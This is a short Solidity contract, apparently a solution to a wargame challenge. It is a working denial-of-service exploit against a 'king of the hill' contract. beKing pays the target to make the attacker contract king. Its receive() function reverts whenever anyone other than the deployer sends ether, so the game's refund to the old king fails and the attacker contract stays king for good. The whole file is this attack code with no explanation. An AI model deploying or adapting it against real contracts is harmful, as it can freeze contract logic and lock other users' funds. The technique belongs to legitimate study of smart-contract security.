// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;


contract KingForever {
    address king;  

    constructor() {
        king = msg.sender;
    }

    function beKing(address _kingGame) external payable {
        _kingGame.call{value: msg.value}("");
    }

    receive() external payable {
        king.call{value: address(this).balance}("");
        require(msg.sender == king);
    }
}
